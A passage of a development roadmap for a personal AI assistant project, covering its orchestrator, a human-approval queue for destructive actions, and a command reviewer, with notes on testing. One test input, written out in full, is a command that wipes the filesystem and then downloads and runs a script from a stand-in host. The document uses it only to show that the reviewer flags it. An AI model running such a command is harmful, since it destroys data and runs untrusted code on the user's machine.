      per-call regression — but even a single isolated trivial call was
      still over two minutes on its own). Acceptable for what
      `TIER_DESCRIPTIONS` already frames opus as being for ("genuinely
      complex... needing the most capable model"), but a real cost to
      know about before chaining several opus calls in one flow (the
      planner below does exactly that for a decompose+per-step case).
- [x] New shared `hi/chat_model.py`: `make_chat_model()` probes each
      model name once (a real "Hi" call) for whether `reasoning=True`
      actually works, caching the result — a model that flat-out
      rejects the kwarg is never asked again, and only a _confirmed_
      answer is cached (a transient/unrelated failure isn't, so a later
      call gets a fresh chance rather than being stuck on a false
      negative). Wired into `hi/models.py`'s `get_tier_model()` _and_
      all four personas' own module-level default model construction
      (`term`/`butler`/`docs`/`web` — previously plain `ChatOllama(...)`
      calls) — every real model this project ever constructs now goes
      through the same probe, not just router-mode ones.
- [x] `hi/streaming.py` now surfaces a reasoning-capable model's real
      `thinking` content live, dimmed and prefixed `(thinking) ...`,
      reset before the actual answer prints — previously silently
      dropped entirely (confirmed empty before this fix), the exact gap
      a sibling project on this machine (`sage/backend`) already found
      and fixed for the same underlying Ollama models. Thinking content
      is deliberately never fed to `shown_chunks`/`speech_queue` —
      hearing a model's raw internal monologue spoken aloud by Phase
      11's TTS would be strange, not useful; only the real answer is
      spoken/returned/logged. **Voice companion's Processing view
      deliberately NOT touched** — still-standing "don't integrate
      features into the Swift app yet" directive from earlier this
      session; the terminal side is done, the Swift side is a real,
      separate follow-up once that directive lifts.
- [x] Opt-in "smart" arbiter/retro variants — a real model call
      alongside (never replacing) the existing deterministic defaults.
      `hi/synthesis/arbiter.py`: `what_next_smart()` (new `term` tool) —
      same underlying signals (priority/due/idle/context-note) as
      `pick_next_hour()`'s scorer, handed to a real opus-tier call for a
      narrative recommendation instead of picking whichever task scored
      highest. `hi/synthesis/retro.py`: `generate_retro_smart()` (new
      `term` tool) — generates/reuses the same deterministic retro note,
      then appends a "Reflection (smart, opt-in)" section from a real
      model call interpreting the same aggregated data.
- [x] A lightweight supervisor/planner pass, new `hi/synthesis/
    planner.py`, wired into `hi/repl.py`'s `run_router_repl()`: a
      cheap, model-free regex heuristic (`looks_multi_step()` — a real
      sequencing signal, or 3+ distinct imperative verbs in a long
      prompt) gates a real opus-tier `decompose()` call, so the common
      single-step turn (the overwhelming majority) pays zero extra
      latency/cost. When `decompose()` genuinely returns 2+ ordered
      sub-steps, each is routed through the SAME `classify()` +
      persona-agent machinery a normal turn already uses (reusing/
      populating the same `agent_cache`, not a parallel mechanism), then
      a sonnet-tier call synthesizes one final answer from the real
      per-step results.
      — **Superseded and removed in Phase 16**: that phase's real
      DAG-based orchestrator (parallel execution, scoped tools,
      checkpointing) does everything this mechanism did and more,
      folding the "does this need a plan" signal into the SAME
      classification call instead of a second, separate check —
      running both would have been pure duplicated cost for the same
      question every turn. `hi/synthesis/planner.py` was deleted once
      confirmed (via grep) to have no other caller; see Phase 16's own
      write-up for the replacement and why.
- [x] Long-context synthesis mode, new `hi/synthesis/longcontext.py`'s
      `synthesize_vault()` (new `term` tool): reads the ENTIRE vault
      (every knowledge note, optionally every conversation log too) in
      one real model call, instead of `hi/memory_graph.py`'s existing
      relevance-selection step — the right complement for "summarize/
      find patterns across everything" questions, where selecting a
      relevant subset is actively the wrong approach, not a replacement
      for point-lookup grounding. Bounded by a real 300K-char ceiling,
      with truncation stated plainly in the answer if ever exceeded
      rather than silently answering from a partial view.
- [x] A periodic reflection pass, new `hi/synthesis/reflection.py`'s
      `run_weekly_reflection()`/`propose_preferences()`: reads the past
      week's `hi/conversations/` logs (already written for every
      persona, every turn) and proposes durable facts/preferences,
      appended under a dated header to `hi/knowledge/preferences.md` —
      framed plainly as suggestions from that week's conversations, not
      silently merged in as fact (just a Markdown file, trivially
      prunable by hand, same as every other vault note). Deliberately
      conservative: told explicitly to reply with a fixed "nothing
      found" marker rather than force a proposal when nothing durable
      stood out. Rides along inside `hi/personas.py`'s existing Sunday
      weekly-retro trigger (`_maybe_generate_weekly_retro()`) — a
      fourth instance of the same "next Sunday session" pattern this
      codebase already uses three times, not a new scheduling
      mechanism — and is failure-tolerant on its own terms too
      (`run_weekly_reflection()` swallows any model error so one bad
      week never blocks the retro itself from generating). Also exposed
      as an on-demand `term` tool, `reflect_on_week()`.
- [x] Model-judgment enrichment, `hi/suggest/engine.py`'s new
      `_smart_suggestions()`: layered on top of every deterministic gate
      (idle repos, deadlines, LeetCode, applications, context-shift,
      diff-watch) — never a replacement, and those stay the always-on
      floor regardless of whether this succeeds. Gated behind a new
      `SMART_SUGGESTIONS_ENABLED` flag (off by default — the same "an
      extra recurring background cloud-model cost should be opted into,
      not incurred silently" reasoning `DIFF_WATCH_ENABLED` already
      established in Phase 12), and wrapped in a bare `try/except` that
      degrades to "nothing extra" on ANY failure — "an unattended loop
      shouldn't depend on a model call succeeding to do anything at
      all" taken literally, not just as a design intention.

**Live-verified, not just written** — every mechanism below was run for
real, not assumed, each against isolated fake data (never the real vault)
except the four-persona reasoning-probe check, which used this project's
actual real configured models: `qwen3.5:397b-cloud` confirmed genuinely
`402`-gated; `nemotron-3-ultra:cloud`/`nemotron-3-super:cloud` both
pulled and confirmed callable; `get_tier_model()` confirmed resolving all
three tiers correctly, `nemotron-3-ultra:cloud` included; all four
personas' own default models confirmed reasoning-aware
(`model.reasoning == True` for `term`/`butler`/`docs`/`web`, each a real
probe against the real configured model); `hi/streaming.py`'s thinking
surfacing confirmed against a real `gpt-oss:20b-cloud` stream — a real
dimmed "(thinking)" block appeared, reset correctly, and the final
returned message content was the clean answer only (`'56'`), no thinking
leakage; `smart_pick_next_hour()` against 2 fake tasks produced a real,
specific, correctly-reasoned recommendation (correctly weighed an idle
project + high priority over a low-priority one); `generate_smart_weekly_retro()`
produced a real, specific narrative reflection referencing actual commit
counts and dates from this session's own real git history (test used a
real project's git log rather than a fully synthetic one — harmless,
read-only, nothing left this machine — but not the isolated-data-only
test originally intended); `synthesize_across_vault()` against 3 fake
notes correctly found and cited a cross-note pattern (two projects both
noted as using Vue, correctly connected to a third note's "extract a
shared component library" idea); `_smart_suggestions()` confirmed both
gated off by default (`SMART_SUGGESTIONS_ENABLED` unset → `[]`, no model
call at all) and, with the flag set, correctly proposing a real pattern
across 3 fake related tasks — and confirmed fail-open with a simulated
model exception (`[]`, no crash); `looks_multi_step()` confirmed correct
across 8 real single-step/multi-step example prompts (one heuristic gap
found and fixed live — "once you check the weather, open safari" didn't
originally trip it); `decompose()` confirmed producing a real, correct
3-step ordered plan for a genuine multi-step, multi-persona request, AND
confirmed correctly returning `None` for a single-step request the
heuristic flagged as a false positive (`"search files for the word TODO
across this project"` — 4 distinct verb-shaped words, but genuinely one
task). Full repo `py_compile` clean throughout. Tool count recomputed
directly from all four personas' real `TOOLS` lists: **74** (up from 70
in Phase 13); Python source: **7,416 lines across 80 files**.

**`run_plan()`'s full end-to-end glue**, confirmed live with two cheap
real sub-steps ("What is the capital of Japan?" / "What is 12 times
12?"): both steps ran through the real `classify()`+persona-agent path,
printed live per-step progress (including a real "(thinking) ..." block
for each — Phase 14's own streaming fix visibly composing correctly with
Phase 14's own planner), and the synthesis step produced a correct final
answer ("Tokyo" / "144"), with `agent_cache` correctly populated
(`[('web', 'haiku')]`). **A real, honest, pre-existing gap this test
surfaced, not a planner bug**: `classify()` routed the arithmetic
sub-step to `web` (Wikipedia-only), which has no calculator — its own
strict "don't fabricate" system prompt correctly refused rather than
guess ("No relevant article found"), and the _synthesis_ model's own
general knowledge is what actually recovered the correct "144" in the
final answer. That's `classify()`'s pre-existing persona-selection
behavior for a bare arithmetic question, unrelated to anything this
phase built — worth knowing (a math-heavy sub-step could silently rely
on the synthesis step's general knowledge rather than a verified tool),
but not a defect in `run_plan()` itself, which did exactly what it was
supposed to with the routing it was given.

**`reflect_on_week()`'s full end-to-end run**, confirmed live against
three fake conversation exchanges (a coding-style preference, a trivial
factual Q&A, a scheduling preference): correctly proposed exactly the
two genuinely durable preferences ("use tabs, not spaces" / "avoid
morning meetings before 10am") under a real dated header in
`preferences.md`, and correctly did NOT propose anything from the
trivial "what is the capital of France" exchange — precise, not just
"found something," confirming the conservative "only genuinely durable"
instruction actually works as designed rather than over-proposing.

_Ref: `BLOCKERS.md` → "Suggested feature improvements" A, B, D, E, F, G._

### Phase 15 — Multi-turn negotiation for the arbiter

- [x] Session-level state, in `hi/repl.py`'s `run_router_repl()` (not a
      new module-level global — scoped to one session's own loop, same
      as `agent_cache`/`prompt_label` already are): `last_arbiter_task_id`
      and `arbiter_rejects: set[str]`. Both reset to empty the instant a
      turn ISN'T a recognized pushback, so a stray "no" many turns later
      about something unrelated can never misfire.
- [x] `hi/synthesis/arbiter.py`'s scoring core factored into a shared
      `_pick_next_task(exclude_ids)`, with two callers: `pick_next_hour(
    exclude_ids=frozenset())` (backward-compatible — `what_next()`'s
      existing call site is completely unaffected, default empty) and a
      new `pick_next_task_for_session(exclude_ids)`, which returns the
      real `Task` object (not just its text) so the router can track
      _which_ task to exclude next by id, not by fragile text-matching.
      A pushback reply re-invokes this directly — the SAME real
      deterministic scoring pass, one task removed — not a parallel
      mechanism and not a fresh unrelated turn.
- [x] The real new plumbing, split into two small pieces in new
      `hi/synthesis/negotiation.py` rather than teaching `classify()`
      itself (classify() stays a single-turn classifier, unmodified —
      the negotiation check runs _before_ it in `run_router_repl()`,
      short-circuiting the call entirely on a real pushback): - `looks_like_pushback(text)` — a cheap regex ("no", "something
      else", "not that", "a different one", ...), no model call,
      checked ONLY when the previous turn's answer is already known to
      have come from the arbiter (so it can't misfire on an unrelated
      later "no"). - `find_arbiter_tool_result(messages)` — scans a turn's own
      ReAct message history for a `what_next`/`what_next_smart` tool
      result, which is how `hi/repl.py` learns "the arbiter answered
      THIS turn" from the outside, without `term`'s own tools needing
      to separately notify anything. Paired with a new
      `_messages_this_turn()` helper in `repl.py` (slices from the
      most recent `HumanMessage` onward) so this never matches an
      arbiter call from several turns ago against `term`'s own
      `_StatefulAgent`-accumulated history.

**Live-verified, not just written**: `looks_like_pushback()` against 8
real phrases (5 real pushback shapes, 3 real non-pushback turns) — all
correct. `_messages_this_turn()`/`find_arbiter_tool_result()` against a
realistic mocked 6-message history (an earlier unrelated turn, then a
real `what_next` tool-call/tool-result pair, then the final answer) —
correctly sliced to just the 4 messages belonging to the current turn,
and correctly extracted the exact tool result text. The full multi-round
exclusion flow, `pick_next_task_for_session()` called 4 times in
sequence against 3 real fake pending tasks with each round's own pick
excluded from the next: round 1 picked the high-priority idle-project
task, round 2 correctly picked a different one (excluding round 1's
id), round 3 correctly picked the last remaining one (excluding rounds
1+2), and round 4 — everything excluded — correctly returned `None`
rather than repeating an already-rejected task or crashing. Full repo
`py_compile` clean throughout.

**Honest scope note**: only the deterministic `pick_next_hour()`/
`what_next()` path negotiates across turns — `what_next_smart()` (Phase 14) doesn't currently participate in pushback exclusion, since a rapid
back-and-forth negotiation is a poor fit for a call on a model already
measured at 120+ seconds for a trivial prompt (see Phase 14's own
`OPUS_MODEL` latency finding). A deliberate scoping choice, not an
oversight — worth revisiting only if real usage asks for it.

_Ref: `BLOCKERS.md` → "Ambient & real-time gaps" #5._

### Phase 16 — Orchestration substrate: multi-subagent DAG execution (start here — nothing in Phases 17-20 works without this)

- [x] `hi/orchestrator/complexity.py` — `classify_with_plan()` extends
      the exact classification prompt `hi/router.py`'s `classify()`
      already sends with one more field (`persona tier plan`, `plan`
      exactly `yes`/`no`), so a turn's complexity is known from the
      SAME haiku-tier call, not a second one. Deliberately conservative
      (defaults to `False` on anything ambiguous) — the opposite bias
      from Phase 14's retired heuristic, which erred toward false
      positives since it only gated a cheap follow-up check; here a
      false positive pays the real DAG-executor cost, so the bias had
      to flip
- [x] `hi/orchestrator/planner.py` — `plan_tasks()`, one opus-tier call
      (same tier Phase 14's `decompose()` used) returning structured
      JSON — not free-text lines, since a real DAG needs ids,
      dependency edges, and a tool subset per task, which an ordered
      list of strings can't express. Grounds `tool_scope` in each
      persona's REAL tool names (via `subagent.py`'s
      `persona_tool_names()`) so the model isn't guessing plausible-
      sounding tool names. **A real defensive gap found and closed
      before this was trusted**: nothing stopped a model-produced
      dependency graph from containing a genuine cycle (undetectable
      from any single task in isolation) — added `_break_cycles()`, a
      plain DFS-with-recursion-stack cycle breaker that drops the
      specific edge closing each cycle found, not the whole task
- [x] `hi/orchestrator/subagent.py` — `build_subagent()` builds a
      plain, stateless `create_agent()` per task directly (not through
      each persona's own `build_agent(model)`, which wraps `term` in
      cross-turn memory/vault-grounding extras a single scoped DAG task
      doesn't need — a deliberate simplification, not an oversight).
      `tool_scope` narrows to a named subset of that persona's real
      tools; an empty match falls back to the full list rather than
      leaving a subagent with zero tools and no way to act
- [x] `hi/orchestrator/graph.py` — the DAG executor: a REAL LangGraph
      `StateGraph` (one node per task, edges per `depends_on`) — so
      LangGraph's own execution engine handles topological scheduling,
      running independent nodes concurrently under `.ainvoke()`, rather
      than hand-rolling `asyncio.gather` + a manual topological sort on
      top of a second scheduler. An `asyncio.Semaphore(3)` is layered
      *inside* each node instead, bounding real concurrent model calls
      against the Ollama Cloud account. **A real, significant data-flow
      bug found only by actually running a dependent task, not by code
      review**: `depends_on` correctly ordered execution from the start
      (LangGraph guarantees that for free), but nothing ever threaded
      the depended-upon tasks' actual RESULTS into the dependent task's
      own prompt — a "compare X and Y" task that depended on the tasks
      that looked up X and Y ran right on schedule with no idea what
      they'd found, and (live-verified) asked for clarification instead
      of doing its job. Fixed by prepending each real upstream result
      (read from `state["results"]`, which LangGraph guarantees is
      already populated for every `depends_on` entry by the time this
      node runs) into the subagent's own prompt content
- [x] `hi/orchestrator/blackboard.py` — `AsyncSqliteSaver` (the
      `langgraph-checkpoint-sqlite` package, a new real dependency —
      not in this project's `langgraph` install by default) as the
      actual checkpointer, one SQLite file under `~/.hi/
      orchestrator_runs.db`, so a run's state survives a crash mid-DAG
- [x] `hi/orchestrator/aggregator.py` — `synthesize()`, a sonnet-tier
      call (not opus — this is summarizing already-gathered results,
      not the harder decomposition judgment call) merging every task's
      real result into one coherent final answer, the same shape Phase
      14's retired `run_plan()` used for its flat list
- [x] Every completed run is written as a dated note under
      `<VAULT_PATH>/hi/conversations/runs/` — real DAG shape, each
      task's persona/tier/dependencies, the REAL tool names it actually
      called (extracted from the subagent's own message history, not
      guessed), and its real result — "the filesystem is the single
      source of truth" stays true for multi-agent runs too
- [x] **Deviation from this item's original wording, worth being exact
      about**: not `hi/router.py` itself — `hi/repl.py`'s
      `run_router_repl()` now calls `classify_with_plan()` in place of
      `hi.router.classify()`, and hands off to
      `hi.orchestrator.graph.run_orchestrated()` (bridged via
      `asyncio.run()`, since the REPL loop itself is synchronous) when
      `needs_plan` is true. Keeping `hi/router.py` itself completely
      unmodified was deliberate, not an oversight: `complexity.py`
      imports `hi.router`'s `PERSONA_DESCRIPTIONS`/`TIER_DESCRIPTIONS`/
      `TIERS` constants for its own richer prompt, and having
      `hi.router` import back from `hi.orchestrator` would create a
      real circular import. `hi/wake.py` (Phase 11) and
      `hi/ipc/server.py` (the voice companion) deliberately still use
      the plain, unchanged `classify()` — extending orchestration to
      those two surfaces is real, separate, out-of-scope-here follow-on
      work, not something this phase silently skipped

**This also superseded and removed `hi/synthesis/planner.py`** (Phase
14's regex-heuristic-then-opus-call mechanism) rather than letting it
coexist — running two independent "does this need decomposition"
checks on every turn would be pure duplicated cost for the same
question, and the new mechanism is strictly more capable (a real
parallel DAG with scoped tools and checkpointing, not a sequential flat
list). Confirmed via grep that `hi/repl.py` was its only caller before
deleting it.

**A second, unrelated real bug found and fixed along the way**:
`hi/mcp_tools.py`'s `get_mcp_tools()` (and `_sync_wrap()`'s per-
invocation tool bridge) did a bare `asyncio.run()`, which raises
outright ("cannot be called from a running event loop") the first time
a persona module is imported from *inside* an already-running loop —
exactly what happens the first time the orchestrator's own
`graph.ainvoke()` needs a persona `subagent.py` hasn't built yet in this
process. Confirmed live via the actual traceback, not assumed. Fixed at
the root with a new `_run_sync()` helper: uses `asyncio.run()` unchanged
when no loop is running (every existing synchronous caller, untouched),
falls back to running the coroutine on a fresh thread (with its own
fresh loop) via `concurrent.futures.ThreadPoolExecutor` when one already
is.

**Live-verified end to end, not just unit-tested in isolation**, against
a genuinely parallelizable real request ("search Wikipedia for what a
Kubernetes pod is, and separately search Wikipedia for what a Docker
container is, then save a note comparing them"):
`classify_with_plan()` correctly returned `needs_plan=True` for this
prompt and `False` for two genuinely simple ones; `plan_tasks()`
produced a real 3-task DAG — two independent Wikipedia-lookup tasks
(`web`, `tool_scope=["search_wikipedia"]`) plus a `docs` task correctly
`depends_on`-ing BOTH of them; the async-import bug was hit and fixed
via a real traceback from a genuine first-ever import inside the
running loop; the first full run correctly executed all three tasks
and produced a real synthesized comparison answer, but exposed the
data-flow bug (t3's own result was a request for clarification, having
received no real content from t1/t2); after the fix, an identical
re-run showed t3 correctly referencing "the information you provided"
and **actually calling `create_note`** (it hadn't before, with no real
content to write about) — confirmed by reading the real created vault
note directly before deleting it; the written run-log note correctly
captured the real DAG shape and — a nice, unplanned confirmation of the
tool-call-capture logic — that `t1` had called `search_wikipedia` four
separate times while `t2` only needed one. Cycle-breaking
(`_break_cycles()`) verified against a genuine 3-node cycle
(`t1→t3→t2→t1`), confirmed correctly broken into an acyclic chain by an
independent reachability check. All test artifacts (the created vault
note, both run-log notes) were written to the user's real configured
Obsidian vault during this testing and were found and deleted
afterward, not left behind. Full repo `py_compile` clean; Python
source: **7,866 lines across 86 files** (up from 7,416/80, net of
`hi/synthesis/planner.py`'s removal); one new real dependency,
`langgraph-checkpoint-sqlite` (12 direct dependencies total, up from
11).

**Honest limitation**: `MAX_CONCURRENT_MODEL_CALLS = 3`'s actual
throttling behavior wasn't independently stress-tested (this run's own
DAG only ever had 2 tasks genuinely eligible to run concurrently, never
enough in flight to observe the semaphore actually blocking a third) —
`asyncio.Semaphore` is a standard, well-trusted primitive, so this is
low risk, but flagged rather than silently assumed exercised.

_Ref: `BLOCKERS.md`, the orchestration section starting ~line 549 (no
`#`/`##` header of its own in the file — a formatting gap worth fixing
there separately, not addressed here) → "Todos" Phase 1, items 1-7._

### Phase 17 — Action safety under autonomy: pending-approval queue (build after Phase 16)

- [x] `hi/orchestrator/pending_actions.py` — an in-process queue
      (`threading.Event`-based, not `asyncio.Event`, since a sync
      tool's confirm call can run on either the event loop's own thread
      or a LangChain-managed worker thread) of destructive actions
      awaiting human confirmation. `is_orchestrated_context()` is how a
      caller tells "normal interactive turn" from "orchestrated
      subagent" apart — a plain module-level counter incremented/
      decremented by `graph.py` around each subagent call (not
      `contextvars`, whose propagation into a tool's worker thread
      isn't guaranteed), correct because `hi`'s actual usage is one
      user driving one thing at a time: the REPL's own blocking
      `asyncio.run()` call already rules out a normal interactive tool
      call happening concurrently with an orchestrated run in the same
      process. `wait_for_approval()` denies on a 5-minute timeout
      rather than hanging forever or silently proceeding — an
      unattended run should fail safe — and prints a periodic reminder
      with the exact `curl` commands to resolve it (see the indicator
      item below for why that's the real mechanism, not a decoration).
- [x] Reworked both `confirm_destructive()` (`hi/action_tiers.py`) and
      the shell-command confirm path (`hi/agents/term/term.py`'s
      `run_shell_command`, which previously had its own separate inline
      `input()` prompt) to share ONE mechanism: `confirm_destructive()`
      checks `is_orchestrated_context()` and routes to
      `wait_for_approval()` when true, falling through to the exact
      same blocking `input()` as before — completely unchanged — for
      every normal interactive turn. `run_shell_command` now just calls
      `confirm_destructive(f"run: {command}")` instead of duplicating
      the prompt, so the orchestrator-safety fix applies to shell
      commands automatically, not as a second special case.
- [x] A visible "pending approvals" indicator, built for real in both
      places asked for:
      - **tmux REPL**: `wait_for_approval()`'s own printed reminder,
        above — genuinely the only thing that CAN work here, not a
        simplification. The REPL's own terminal is synchronously
        blocked inside `asyncio.run(run_orchestrated(...))` at the
        exact moment a subagent hits a destructive action, so it
        can't ALSO be reading a fresh "y/N" keystroke from the same
        prompt; the honest fix is telling the user exactly what to run
        from *another* window, not pretending an inline prompt could
        work here.
      - **Swift voice companion**: `PendingActionsMonitor.swift` (new,
        mirrors `BackendHealthMonitor.swift`'s own polling pattern)
        polls `GET /pending` every 5s; `StatusItemController.swift`
        shows a distinct amber "N awaiting approval" menu bar icon and
        a per-action Approve/Deny submenu in the menu, wired to the new
        `BackendClient.swift` methods (`fetchPendingActions()`,
        `resolvePendingAction(id:approve:)`).
      - **A new dedicated server was required, not just new routes on
        the existing one — found by actually testing this, not
        assumed**: `hi/ipc/server.py`'s `/pending` routes live in the
        voice companion's own process, but an orchestrated run
        (Phase 16) only ever happens inside the terminal REPL's
        process — `run_orchestrated()` was never wired into
        `hi/ipc/server.py`'s `/query` path. That means those routes
        could never see a real pending action; asking them would
        always return an empty list. Added
        `hi/orchestrator/pending_server.py`, a small dedicated
        `ThreadingHTTPServer` on **port 8766** (not the voice
        companion's 8765, so both can run at once without conflicting
        — a normal terminal session alongside the voice companion is a
        real setup), started as a background thread the moment
        `hi/repl.py`'s `run_router_repl()` begins — the one process
        that actually needs it. The route-handling logic itself
        (`hi/orchestrator/pending_http.py`) is shared between both
        servers rather than duplicated, so `hi/ipc/server.py` keeps its
        own `/pending` routes too — genuinely correct, just not
        reachable for this purpose *yet* — ready for whenever a future
        phase wires orchestration into that process as well.

**Live-verified end to end, not just unit-tested in isolation** — three
real scenarios, not assumed correct from code review alone: (1) the
normal interactive path is provably untouched — `confirm_destructive()`
called outside an orchestrated context still calls the real `input()`
(both accept and decline paths produced the exact same behavior as
before); (2) `run_shell_command`'s refactored path — mocked only the
tmux-dependent execution step, not the confirm logic itself — correctly
declines, correctly accepts, and correctly skips confirmation entirely
for a non-destructive command, with a hard assertion that `input()` is
never called in that last case; (3) the full asynchronous path,
end-to-end, with zero mocking of the queue itself: started
`pending_server` in a real background thread, called
`confirm_destructive()` from inside a simulated orchestrated context on
a separate thread (correctly never touching `input()` — enforced with
the same hard assertion), confirmed the real `GET /pending` (port 8766)
showed the exact pending action with a fresh, unique marker, resolved
it with a genuine `curl -X POST .../approve`, and confirmed the waiting
thread unblocked with the correct result and the process exited
cleanly. The timeout/fail-safe path was verified separately with a
real 2-second timeout — printed the correct periodic reminders and
correctly returned `False` after timing out, not hanging. **A messy
false start along the way, worth being honest about**: an earlier
attempt at this same end-to-end test produced confusing, seemingly-stale
results — traced to this session's own test-harness bugs (a shell
variable-escaping mistake, and a non-daemon thread from a killed test
script left running in the background) compounding into what looked
like a product bug but wasn't; resolved by using unique per-run markers
and proper daemon-thread/process cleanup in the corrected test, which
then behaved exactly as expected.

On the Swift side: `swift build` clean (no errors, no warnings), the
packaged `.app` launches and stays running with no crash log (checked
directly, both immediately after launch and several seconds later,
same standard as every prior Swift change this session). **Not
verified**: the actual on-screen menu (does the amber icon/Approve-Deny
submenu really look and behave right) — same standing "no way to see or
drive a live native window" limitation as every other Swift change in
this project.

_Ref: `BLOCKERS.md` → "Todos" Phase 2, items 8-10._

### Phase 18 — AG-UI adoption: structured event streaming (build after Phase 16)

- [ ] Add the AG-UI Python SDK as a dependency — check its own reference
      LangGraph integration before hand-writing an event mapper, since
      it already has first-class LangGraph support
- [ ] `hi/agui_adapter.py` — maps LangGraph's `astream_events()` output
      to AG-UI's typed event schema (`RUN_STARTED`,
      `TEXT_MESSAGE_CONTENT_DELTA`, `TOOL_CALL_START/ARGS/END`,
      `STATE_DELTA`, `CUSTOM` for MCP-UI payloads, `RUN_FINISHED`)
      instead of flat token strings. The actual point: a flat token
      stream can't express "3 subagents are running in parallel" or
      "here's a tool's rendered widget, not just its text result" — a
      typed event stream can, and any AG-UI-aware client (including one
      this project didn't write) can render a run without a bespoke
      wire format
- [ ] **Correction to `BLOCKERS.md`'s own framing, worth getting right
      before starting**: it names `hi/streaming.py` and `hi/server.py`'s
      `/turn` endpoint as what gets rebuilt on this adapter — neither
      exists under those names/roles. `hi/streaming.py` is
      `stream_and_print()`, printing tokens to the *terminal's own
      stdout* (no network client to speak AG-UI to); the real
      network-facing streaming surface is `hi/ipc/server.py`'s
      `POST /query` (newline-delimited JSON today, used by the Swift
      voice companion). AG-UI adoption belongs on `hi/ipc/server.py`,
      not `hi/streaming.py` — rebuild `/query` on the new adapter
      instead of its current hand-rolled `{event: persona/token/done}`
      shape. The voice companion's `BackendClient.swift` needs matching
      decode-side updates once this lands — a real, flagged follow-on
      cost, not a small side effect
- [ ] Extend `hi/mcp_tools.py` to detect MCP-UI resource blocks in tool
      results (structured widgets, not just strings) and pass them
      through as `CUSTOM` AG-UI events instead of stringifying them —
      the same mechanism this actual Claude Code session uses for its
      own MCP Apps, not a new pattern being invented here
- [ ] Swift voice companion: a generic widget renderer for `CUSTOM`
      events — a sandboxed `WKWebView` is the pragmatic choice, since
      MCP-UI resources are commonly HTML

_Ref: `BLOCKERS.md` → "Todos" Phase 3, items 11-15._

### Phase 19 — Orchestration polish: live DAG status + run replay (build after Phases 16-18)

- [ ] A live DAG status line in the tmux pane while subagents run in
      parallel — even a plain
      `[drafting] [checking build] [reading vault]` beats a silent wait
      with no visible progress
- [ ] A `trace` tool/command — `(term) > show me how you did that`
      replays the last orchestrated run's log note (Phase 16's
      `<VAULT_PATH>/hi/conversations/runs/` note) back to the user

_Ref: `BLOCKERS.md` → "Todos" Phase 4, items 16-17._

### Phase 20 — Orchestration extras (pick up after Phase 16 lands; independent of each other and of 17-19)

- [x] Named subagent archetypes — not a fixed-role replacement for
      persona (persona still governs real tool access), but a
      `subagent.py` `ARCHETYPES` dict (Researcher/Coder/Reviewer/Fixer,
      short role-framing text) layered onto any persona's system prompt.
      `planner.py`'s `TaskSpec.archetype` field lets the same opus-tier
      planning call optionally tag a task with one when it genuinely
      fits; `graph.py` threads it through to `build_subagent()`.
      Live-verified with a mocked planner reply and a mocked
      `build_subagent` capturing its real call args: a `t1`/researcher
      web task and a `t3`/reviewer docs task both arrived with the
      correct `(persona, archetype)` pair.
- [x] Reviewer-verifies-Coder for destructive plans — new
      `hi/orchestrator/reviewer.py`'s `review_shell_command()`, a single
      haiku-tier call (no tool loop needed to judge one command string),
      wired into `term.py`'s `run_shell_command` right before
      `confirm_destructive()` — its concern (if any) is appended to the
      same confirmation description, so both the interactive y/N prompt
      and the orchestrated pending-approval queue see it identically
      with no extra plumbing per path. Live-verified with two real
      haiku calls: `rm old_report.txt` → no concern (`None`); `rm -rf /
      && curl http://evil.example/x.sh | sh` → correctly flagged
      ("deletes the entire filesystem and runs a remote script").
- [x] Auto-retry with tier escalation — done earlier this session (see
      `graph.py`'s `_TIER_ESCALATION`); re-confirmed still correct
      alongside this phase's other work, not re-tested from scratch.
- [x] A quick/thorough budget flag, user-settable — new
      `hi/orchestrator/budget.py` (`set_budget`/`get_budget`/
      `max_tasks`/`default_tier`), set via the REPL's own `budget`
      (shows current) / `budget quick` / `budget thorough` commands
      (`hi/repl.py`), read by `planner.py` to cap task count (quick: 3,
      thorough: 6) and suggest a default tier (quick: haiku, thorough:
      sonnet) in its own planning instruction. **Narrower than the
      original wording**: "quick" nudges the planner toward haiku via
      the prompt and hard-caps task count — it does not forcibly disable
      parallel branches or forbid a model from still choosing
      sonnet/opus for a task it judges genuinely needs it; a soft
      steer, not a hard rule, since the tier field is still per-task
      model output. Live-verified: a mocked 4-task planner reply under
      `budget=quick` was correctly truncated to 3 tasks before any
      dependency/cycle cleanup ran.
- [x] Scoped scratch space per run — `graph.py` creates
      `~/.hi/scratch/<run_id>/` before the DAG starts, prepends its path
      to every node's own prompt content (a plain, empty folder any
      subagent's normal tool calls can read/write, no new tool needed),
      and `shutil.rmtree`s it in a `finally` once the run ends (success
      or failure). Live-verified with two mocked-subagent tasks: both
      received the identical real scratch-dir path in their prompt
      content, and the directory was confirmed gone from disk
      immediately after `run_orchestrated()` returned.
- [x] Approvals as generative UI, not text — picked back up and built,
      not deferred after all. New CUSTOM events `pending_action`/
      `pending_action_resolved` (`hi/agui_adapter.py`'s
      `_pending_action_events()`, checked once per `stream_orchestrated_
      as_agui()` loop tick) translate `hi/orchestrator/pending_actions.py`'s
      plain queue into the same real-time stream every other part of a
      turn already flows through — additional to, not a replacement for,
      Phase 17's existing menu-bar indicator. Needed one real fix in
      `pending_actions.py` itself first: `resolve()` only marked an
      action resolved in `_pending`, which `wait_for_approval()`'s own
      thread pops sometime after waking up — a concurrent poller could
      race that pop and see neither "pending" nor "resolved". Added a
      separate `_resolved` dict, written the instant `resolve()` runs
      (and on timeout too), so `resolution_of()` is race-free regardless
      of the original waiter's own thread scheduling. Swift side:
      `PendingActionCard.swift` (new) renders real tappable Approve/Deny
      buttons inline, wired through `BackendClient.swift`'s two new
      `BackendEvent` cases, `AppState.swift`'s `pendingActions` array
      (`addPendingAction`/`markPendingActionResolved`, the latter showing
      a brief "Approved"/"Denied" state before removal), and
      `PanelController.swift`'s height math (restructured to fold widget
      + pending-card height into one `ExtraContent` value, since Combine's
      built-in operators cap out at 4 publishers). **Live-verified twice
      at the level that matters most**: (1) the raw mechanism — a real
      background thread calling `wait_for_approval()`/`resolve()`,
      polled by the actual `_pending_action_events()` function, correctly
      emitting `pending_action` then `pending_action_resolved` with the
      right approved value; (2) the exact function `hi/ipc/server.py`
      calls in production — `stream_orchestrated_as_agui_sync()` — driven
      with a mocked DAG task that really blocks on `wait_for_approval()`
      (dispatched via `asyncio.to_thread`, matching how LangChain
      actually runs a sync tool's `_run()`, not a naive direct call that
      would freeze the whole event loop and silently break the very
      concurrency this feature depends on — caught exactly that bug in
      the test's first draft, fixed it, re-ran clean). Swift: `swift
      build` clean, packaged app relaunched and confirmed stable (no
      crash reports) with the new code.
- [x] Conversational MCP server install — new `hi/mcp_install.py`:
      `list_available_mcp_servers()` shows the known catalog
      (playwright/github/obsidian) and what each still needs;
